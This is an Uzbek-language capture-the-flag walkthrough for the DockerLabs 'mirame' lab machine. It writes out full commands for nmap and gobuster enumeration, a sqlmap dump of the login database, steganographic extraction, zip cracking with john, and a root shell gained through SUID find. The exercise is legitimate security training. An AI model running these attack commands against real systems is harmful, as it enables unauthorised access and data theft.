# LookAtMe-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 22 SSH, 80 http
Users: carlos, root
Vulnerability: SQL Injection, Steganography, SUID /usr/bin/find
```

## root flag:
> 📸 Screenshot (Notion sahifasida)

## user flag:
> 📸 Screenshot (Notion sahifasida)

---

# 1. Enumeration

Mashinamiz nomi `mirame` dockerlabsdan. Mashinani IP manzili (`172.17.0.2`) berilgan. Bundan foydalanib ochiq portlarni tekshirdim:

```bash
nmap -sV -sC -A -p- --min-rate 1000 172.17.0.2
```

Natijada 2 ta port ochiq:
- 22 SSH
- 80 http

Brauzerda 80 portda login page chiqdi. `SQL Injection` orqali login qilib kirishga muvofiq bo'ldim.

Login qilib kirganimda `page.php` sahifasi ochildi — shahar nomini kiritsang ob-havo haroratini chiqarib berar ekan.

`page.php` sahifasidan zaiflik topa olmadim. Gobuster orqali boshqa sahifalarni qidirdim:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/dirb/wordlists/common.txt -x php,html,env,config,conf,zip
```

`auth.php` sahifasini topdim. Bu sahifada SQL Injection zaifligidan foydalanib database ro'yxatini chiqardim:

```bash
sqlmap -u "http://172.17.0.2/auth.php" --method=POST --data="username=test@&password=test123" --dbms=mysql --batch --dbs
```

`users` database qiziq tuyildi. Undagi tablelarni o'qidim:

```bash
sqlmap -u "http://172.17.0.2/auth.php" --method=POST --data="username=test@&password=test123" --dbms=mysql --batch -D users --tables
```

```bash
sqlmap -u "http://172.17.0.2/auth.php" --method=POST --data="username=test@&password=test123" --dbms=mysql --batch -D users -T usuarios --dump
```

4 ta user credentiali topildi. Lekin ular bilan SSH yoki login ishlamadi.

`directorio` so'zini sahifa deb tarjima qilib, brauzerda `directoriotravieso` sahifasini ochdim — u yerda bitta rasm bor ekan.

---

# 2. Exploitation

Rasmni ko'chirib oldim va steganografiya teknikasini sinab ko'rdim:

```bash
wget http://172.17.0.2/directoriotravieso/miramebien.jpg
```

```bash
stegseek --seed miramebien.jpg
```

StegSeek `2ff55145` urug'i bilan 170 baytli yashirin ma'lumot topdi. Parolsiz extract qildim:

```bash
stegseek extract -sf miramebien.jpg -p ""
```

Topilgan `chocolate` paroli bilan `ocultito.zip` faylini chiqdim:

```bash
steghide extract -sf miramebien.jpg -p "chocolate"
```

`ocultito.zip` passphrase bilan himoyalangan ekan. John bilan crack qildim:

```bash
zip2john ocultito.zip > ocultito.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ocultito.hash
```

Passphrase: `stupid1`

---

# 3. Initial Access

Zip faylni ochdim — ichidan `secret.txt` chiqdi. U yerda credential: **carlos:carlitos**

```bash
ssh carlos@172.17.0.2
```

Tizimga muvofaqiyatli kirdim.

---

# 4. Privilege Escalation

SUID biriktirilgan fayllarni qidirdim:

```bash
find / -perm -4000 2>/dev/null
```

`/usr/bin/find` ga SUID biriktirilgan ekan. GTFOBins orqali root huquqi oldim:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

---

**Mashina muvofaqiyatli yechildi!**
